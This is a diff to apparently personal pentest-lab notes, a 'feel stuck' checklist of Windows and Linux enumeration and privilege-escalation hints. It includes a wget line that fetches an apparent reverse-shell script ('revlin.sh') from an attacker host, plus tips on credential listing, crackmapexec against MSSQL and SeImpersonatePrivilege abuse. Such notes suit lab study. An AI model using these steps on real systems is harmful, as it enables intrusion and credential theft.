@@ -1,6 +1,7 @@
 # FEEL LIKE STUCK???
 - Did we run cmdkey /list?
 - Did we try wget without http:? so "wget 192.168.45.176:443/revlin.sh"
+- Did we try checking "EVERYTHING" inside of user's folder?(ex. .bash_aliases, .bash_history..)
 - Did we try crackmapexec mssql 192.168.x.x ...?
 - Make sure to check history as admin after rooting first machine (smb)
 - Did you try uploading files on inetpub?? ( we can get service account that has seimpersonateprivilege)
